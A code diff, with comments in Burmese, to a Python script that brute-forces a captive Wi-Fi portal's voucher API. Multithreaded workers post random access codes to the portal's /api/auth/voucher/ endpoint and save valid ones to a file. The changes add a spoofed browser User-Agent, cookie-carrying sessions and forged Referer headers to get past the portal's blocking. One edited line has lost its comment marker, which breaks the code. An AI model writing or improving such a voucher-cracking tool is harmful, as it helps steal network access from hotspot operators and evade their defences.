@@ -132,35 +132,51 @@ def select_mode():
     else: CODE_LENGTH = 6
     time.sleep(1)
 
-# --- [ CORE LOGIC - FIXED WAITING STATUS ] ---
+ --- [ CORE LOGIC - FIXED SESSION & COOKIE ] ---
 def get_sid_from_gateway():
     global DETECTED_BASE_URL
     s = requests.Session()
+    s.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'
+    })
     try:
-        r1 = s.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
-        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
-        final_url = urljoin(r1.url, path_match.group(1)) if path_match else r1.url
-        if path_match:
-            r2 = s.get(final_url, timeout=5)
-            final_url = r2.url
+        # Step 1: Get Portal Redirect URL
+        r1 = s.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=10)
+        final_url = r1.url
+        
+        # Step 2: Handshake (Cookie ရအောင် Portal ကို တစ်ခါ အရင်သွားမယ်)
+        s.get(final_url, timeout=10)
+        
         parsed = urlparse(final_url)
         DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
-        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
-        return sid
+        
+        # sessionId သို့မဟုတ် sid ကို ယူခြင်း
+        query_params = parse_qs(parsed.query)
+        sid = query_params.get('sessionId', [None])[0] or query_params.get('sid', [None])[0]
+        
+        # အရေးကြီးသည်: SID ကော Cookie ပါဝင်တဲ့ Session Object ကိုပါ ပြန်ပေးမယ်
+        if sid:
+            return {'sid': sid, 'session': s, 'p_url': final_url}
+        return None
     except: return None
 
 def session_refiller():
     while not stop_event.is_set():
         try:
             if session_pool.qsize() < SESSION_POOL_SIZE:
-                sid = get_sid_from_gateway()
-                if sid: session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
-            time.sleep(0.5)
+                data = get_sid_from_gateway()
+                if data:
+                    session_pool.put({
+                        'sessionId': data['sid'], 
+                        'session_obj': data['session'], # Session ပါ သိမ်းထားမယ်
+                        'p_url': data['p_url'],
+                        'left': PER_SESSION_MAX
+                    })
+            time.sleep(1) # Gateway ကို အရမ်း stress မဖြစ်အောင်
         except: time.sleep(2)
 
 def worker_thread():
     global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
-    thr_session = requests.Session()
     while not stop_event.is_set():
         try:
             if not DETECTED_BASE_URL:
@@ -168,35 +184,44 @@ def worker_thread():
             try: slot = session_pool.get(timeout=2)
             except Empty: continue
             
-            sid = slot.get('sessionId')
-            code = ''.join(random.choices(CHAR_SET, k=CODE_LENGTH))
-            CURRENT_CODE = code # Status Update ဖြစ်အောင် ဤနေရာတွင်ထားပါသည်
+            sid = slot['sessionId']
+            s_obj = slot['session_obj'] # အရင်ရထားတဲ့ session ကို သုံးမယ်
+            p_url = slot['p_url']
             
-            r = thr_session.post(f"{DETECTED_BASE_URL}/api/auth/voucher/", 
-                                 json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
-                                 timeout=6)
+            code = ''.join(random.choices(CHAR_SET, k=CODE_LENGTH))
+            CURRENT_CODE = code
+            
+            # Header ထဲမှာ Referer အပြည့်ထည့်ခြင်းဖြင့် 404/Timeout ကျော်လွှားမယ်
+            headers = {
+                'Referer': p_url,
+                'Content-Type': 'application/json;charset=UTF-8',
+                'X-Requested-With': 'XMLHttpRequest'
+            }
+            
+            # API endpoint ကို base url နဲ့ ပေါင်းစပ်ခေါ်ယူမယ်
+            api_url = f"{DETECTED_BASE_URL}/api/auth/voucher/"
+            
+            r = s_obj.post(api_url, 
+                          json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
+                          headers=headers,
+                          timeout=10)
+            
             TOTAL_TRIED += 1
             
-            if "true" in r.text.lower():
-                limit_label = "???"
-                try:
-                    res_data = r.json()
-                    limit = res_data.get('timeLimit') or res_data.get('data', {}).get('timeLimit')
-                    if limit:
-                        sec = int(limit)
-                        if sec >= 2592000: limit_label = "1 Month"
-                        elif sec >= 86400: limit_label = f"{sec//86400} Day"
-                        else: limit_label = f"{round(sec/3600, 1)} Hrs"
-                except: pass
+            # Response success ဖြစ်၊ မဖြစ် စစ်ဆေးခြင်း
+            if '"success":true' in r.text.lower() or '"code":0' in r.text.lower():
+                limit_label = "Active"
+                # ... (Voucher limit တွက်ချက်တဲ့ အပိုင်းကို ဒီမှာ ထည့်နိုင်ပါတယ်) ...
                 with valid_lock:
                     valid_hits_data.append({"code": code, "hrs": limit_label})
                     TOTAL_HITS += 1
-                    with file_lock:
-                        with open(SAVE_PATH, "a") as f:
-                            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {code} | {limit_label}\n")
+                    with open(SAVE_PATH, "a") as f:
+                        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {code} | {limit_label}\n")
             
+            # Session timeout မဖြစ်သေးရင် ပြန်သုံးဖို့ queue ထဲ ပြန်ထည့်မယ်
             slot['left'] -= 1
-            if slot['left'] > 0: session_pool.put(slot)
+            if slot['left'] > 0 and "Session timed out" not in r.text:
+                session_pool.put(slot)
         except: pass
 
 def live_dashboard():
